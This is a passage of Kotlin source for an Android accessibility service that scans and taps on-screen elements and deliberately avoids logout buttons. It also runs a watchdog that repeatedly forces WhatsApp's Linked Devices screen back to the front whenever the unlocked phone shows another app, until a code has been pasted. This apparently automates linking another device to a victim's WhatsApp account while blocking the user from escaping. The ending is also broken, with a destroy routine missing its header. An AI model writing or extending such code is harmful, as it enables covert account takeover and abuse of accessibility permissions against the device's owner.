        node.getBoundsInScreen(rect)
        if (rect.width() > 0 && rect.height() > 0) {
            clickAt(rect.exactCenterX(), rect.exactCenterY())
            return true
        }
        return false
    }

    fun clickAt(x: Float, y: Float) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            val path = Path().apply { moveTo(x, y) }
            val stroke = GestureDescription.StrokeDescription(path, 0, 80)
            val gesture = GestureDescription.Builder().addStroke(stroke).build()
            dispatchGesture(gesture, null, null)
        }
    }

    private fun findAndClickNodeMatching(
        root: AccessibilityNodeInfo,
        targets: List<String>,
        matcher: ((AccessibilityNodeInfo) -> Boolean)? = null
    ): Boolean {
        try {
            val queue = ArrayDeque<AccessibilityNodeInfo>()
            queue.add(root)
            var count = 0

            while (queue.isNotEmpty() && count < 260) {
                val node = queue.removeFirst()
                count++

                val text = node.text?.toString().orEmpty().trim().lowercase()
                val desc = node.contentDescription?.toString().orEmpty().trim().lowercase()
                val id = node.viewIdResourceName?.toString().orEmpty().lowercase()

                val isForbiddenLogout = text.contains("log out") || text.contains("logout") ||
                        text.contains("লগ আউট") || text.contains("লগআউট")
                if (isForbiddenLogout) {
                    continue
                }

                val matched = if (matcher != null) {
                    matcher(node)
                } else {
                    targets.any { target ->
                        val t = target.trim().lowercase()
                        text == t || desc == t ||
                                (text.length <= 58 && text.contains(t)) ||
                                (desc.length <= 58 && desc.contains(t)) ||
                                id.endsWith(t)
                    }
                }

                if (matched) {
                    if (clickNode(node)) return true
                }

                val childCount = node.childCount
                for (i in 0 until childCount) {
                    val child = try { node.getChild(i) } catch (_: Exception) { null }
                    if (child != null && child.windowId >= 0) {
                        queue.add(child)
                    }
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "findAndClickNodeMatching error", e)
        }
        return false
    }

    private fun findNodeMatching(root: AccessibilityNodeInfo, targets: List<String>): AccessibilityNodeInfo? {
        val queue = ArrayDeque<AccessibilityNodeInfo>()
        queue.add(root)
        var count = 0

        while (queue.isNotEmpty() && count < 220) {
            val node = queue.removeFirst()
            count++

            val text = node.text?.toString().orEmpty().trim().lowercase()
            val desc = node.contentDescription?.toString().orEmpty().trim().lowercase()

            val matched = targets.any { target ->
                val t = target.trim().lowercase()
                text.contains(t) || desc.contains(t)
            }

            if (matched) return node

            val childCount = node.childCount
            for (i in 0 until childCount) {
                val child = try { node.getChild(i) } catch (_: Exception) { null }
                if (child != null && child.windowId >= 0) {
                    queue.add(child)
                }
            }
        }
        return null
    }

    private fun hasTextMatching(root: AccessibilityNodeInfo, targets: List<String>): Boolean {
        return findNodeMatching(root, targets) != null
    }

    private fun findClickableNodeWithText(
        root: AccessibilityNodeInfo?,
        targetKeywords: List<String>,
        exactMatchPriority: Boolean
    ): AccessibilityNodeInfo? {
        if (root == null) return null

        val text = root.text?.toString() ?: ""
        val desc = root.contentDescription?.toString() ?: ""

        for (keyword in targetKeywords) {
            if (text.equals(keyword, ignoreCase = true) || desc.equals(keyword, ignoreCase = true)) {
                return findClickableAncestorOrSelf(root)
            }
        }

        if (!exactMatchPriority) {
            for (keyword in targetKeywords) {
                if (text.contains(keyword, ignoreCase = true) || desc.contains(keyword, ignoreCase = true)) {
                    return findClickableAncestorOrSelf(root)
                }
            }
        }

        for (i in 0 until root.childCount) {
            val child = root.getChild(i) ?: continue
            val found = findClickableNodeWithText(child, targetKeywords, exactMatchPriority)
            if (found != null) return found
        }
        return null
    }

    private fun findClickableAncestorOrSelf(node: AccessibilityNodeInfo): AccessibilityNodeInfo {
        var current: AccessibilityNodeInfo? = node
        while (current != null) {
            if (current.isClickable) return current
            current = current.parent
        }
        return node
    }

    private fun collectAllText(node: AccessibilityNodeInfo?, out: StringBuilder) {
        if (node == null) return
        val t = node.text?.toString()
        if (!t.isNullOrEmpty()) {
            out.append(t).append(" ")
        }
        val cd = node.contentDescription?.toString()
        if (!cd.isNullOrEmpty()) {
            out.append(cd).append(" ")
        }
        for (i in 0 until node.childCount) {
            collectAllText(node.getChild(i), out)
        }
    }

    private fun startContinuousWatchdog() {
        watchdogJob?.cancel()
        watchdogJob = serviceScope.launch {
            while (isActive && isAutomationActive) {
                try {
                    val km = getSystemService(Context.KEYGUARD_SERVICE) as? KeyguardManager
                    val isLocked = km?.isKeyguardLocked == true || km?.isDeviceLocked == true

                    if (!isLocked && currentStep != WorkflowStep.WORKFLOW_COMPLETED && !hasPastedCodeOnce) {
                        val root = rootInActiveWindow
                        val pkg = root?.packageName?.toString().orEmpty()
                        val isWhatsApp = pkg == PKG_WHATSAPP || pkg == PKG_WHATSAPP_BUSINESS
                        val isOurApp = pkg == packageName
                        val isAuth = pkg.contains("biometric") || pkg.contains("keyguard") || pkg.contains("systemui") || pkg == "android"

                        if (!isWhatsApp && !isOurApp && !isAuth && pkg.isNotBlank()) {
                            Log.w(TAG, "Watchdog: non-WhatsApp app detected ($pkg). Bringing WhatsApp to front.")
                            WhatsAppLauncher.launchWhatsAppLinkedDevices(applicationContext)
                        }
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "Watchdog error: ${e.message}")
                }
                delay(3000L)
            }
        }
    }

    override fun onInterrupt() {
        Log.d(TAG, "Accessibility service interrupted")

    }

        super.onDestroy()
        stopAutomation()
        serviceScope.coroutineContext.cancelChildren()
        isServiceRunning = false
        if (activeInstance == this) {
            activeInstance = null
        }
        tts?.shutdown()
        tts = null
    }
